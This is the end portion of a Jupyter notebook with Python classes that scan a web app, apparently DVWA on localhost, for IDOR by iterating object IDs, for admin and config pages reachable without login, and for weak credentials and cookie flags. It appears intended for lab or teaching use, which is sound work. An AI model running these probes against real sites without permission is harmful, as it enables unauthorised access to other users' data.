    "                print(\"âœ… Cookie flags appear secure\")\n",
    "\n",
    "        except Exception as e:\n",
    "            print(f\"[Error] {e}\")\n",
    "        return self.findings\n",
    "\n",
    "\n",
    "class AccessControlTester:\n",
    "    def __init__(self, base_url, session=None, timeout=10):\n",
    "        self.base_url = base_url.rstrip(\"/\")\n",
    "        self.session = session or requests.Session()\n",
    "        self.timeout = timeout\n",
    "        self.findings = []\n",
    "\n",
    "    def test_idor(self, path=\"/vulnerabilities/idor/\", param=\"id\", start=1, stop=3):\n",
    "        \"\"\"Check for IDOR by iterating object IDs.\"\"\"\n",
    "        url = urljoin(self.base_url, path.lstrip(\"/\"))\n",
    "        print(f\"\\nðŸ”Ž Testing IDOR at {url} (param={param})\")\n",
    "\n",
    "        for uid in range(start, stop + 1):\n",
    "            try:\n",
    "                resp = self.session.get(url, params={param: uid}, timeout=self.timeout)\n",
    "                body = resp.text.lower()\n",
    "\n",
    "                if \"unauthorized\" not in body and \"forbidden\" not in body:\n",
    "                    if \"username\" in body or \"email\" in body or \"account\" in body:\n",
    "                        print(f\"ðŸ”¥ Possible IDOR â†’ accessed data for {param}={uid}\")\n",
    "                        self.findings.append({\n",
    "                            \"type\": \"IDOR\",\n",
    "                            \"url\": url,\n",
    "                            \"param\": param,\n",
    "                            \"value\": uid\n",
    "                        })\n",
    "                    else:\n",
    "                        print(f\"[?] {param}={uid} returned content (needs review)\")\n",
    "                else:\n",
    "                    print(f\"[-] {param}={uid} blocked\")\n",
    "            except Exception as e:\n",
    "                print(f\"[Error] {e}\")\n",
    "        return self.findings\n",
    "\n",
    "    def test_role_bypass(self, protected_paths=None):\n",
    "        \"\"\"Try to access sensitive endpoints without authentication.\"\"\"\n",
    "        if protected_paths is None:\n",
    "            protected_paths = [\"/admin/\", \"/config.php\", \"/vulnerabilities/\"]\n",
    "\n",
    "        print(\"\\nðŸ”Ž Testing Access Control (Role Bypass)\")\n",
    "        for path in protected_paths:\n",
    "            url = urljoin(self.base_url, path.lstrip(\"/\"))\n",
    "            try:\n",
    "                resp = requests.get(url, timeout=self.timeout)  # new session (unauth)\n",
    "                if resp.status_code == 200 and \"login\" not in resp.text.lower():\n",
    "                    print(f\"ðŸ”¥ Access Control issue â†’ {url} accessible without login\")\n",
    "                    self.findings.append({\n",
    "                        \"type\": \"Access-Control\",\n",
    "                        \"url\": url,\n",
    "                        \"status\": resp.status_code\n",
    "                    })\n",
    "                else:\n",
    "                    print(f\"[-] {url} seems protected\")\n",
    "            except Exception as e:\n",
    "                print(f\"[Error] {e}\")\n",
    "        return self.findings\n",
    "\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    base_url = \"http://localhost:8080\"  # Change to your DVWA or test target\n",
    "\n",
    "    auth_tester = AuthSessionTester(base_url)\n",
    "    auth_tester.test_weak_credentials()\n",
    "    auth_tester.check_cookie_flags()\n",
    "\n",
    "    access_tester = AccessControlTester(base_url)\n",
    "    access_tester.test_idor(path=\"/vulnerabilities/idor/\", param=\"id\", start=1, stop=5)\n",
    "    access_tester.test_role_bypass()\n",
    "\n",
    "    print(\"\\n=== Findings \")\n",
    "    all_findings = auth_tester.findings + access_tester.findings\n",
    "    if all_findings:\n",
    "        for f in all_findings:\n",
    "            print(f)\n",
    "    else:\n",
    "        print(\"No major authentication or access control issues found.\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6602f345-059b-4570-a271-e19eb22425cd",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
